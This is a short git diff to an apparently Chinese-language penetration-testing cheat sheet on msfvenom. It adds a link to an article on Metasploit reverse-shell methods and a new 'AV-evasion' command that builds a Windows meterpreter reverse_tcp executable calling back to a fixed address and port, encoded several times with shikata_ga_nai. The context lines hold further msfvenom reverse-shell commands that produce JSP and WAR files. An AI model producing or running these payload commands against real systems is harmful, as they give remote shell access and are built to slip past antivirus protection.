@@ -1,4 +1,5 @@
 # msfvemon 
+[MSF生成Payload/反弹shell 方式总结](https://mp.weixin.qq.com/s/pIakrui_9vsQdun7aopUYw)
 
 如果tcp不行换协议
 reverse_tcp
@@ -57,4 +58,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YourP Address> LPORT=<Your Po
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address>LPORT=<Your Port to Connect On> -f raw > shell.jsp
 # WAR
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address>LPORT=<Your Port to Connect On> -f war > shell.war
+```
+免杀版命令
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.161 LPORT=1234 -e x64/shikata_ga_nai -i 5 -f exe > shell.exe
 ```
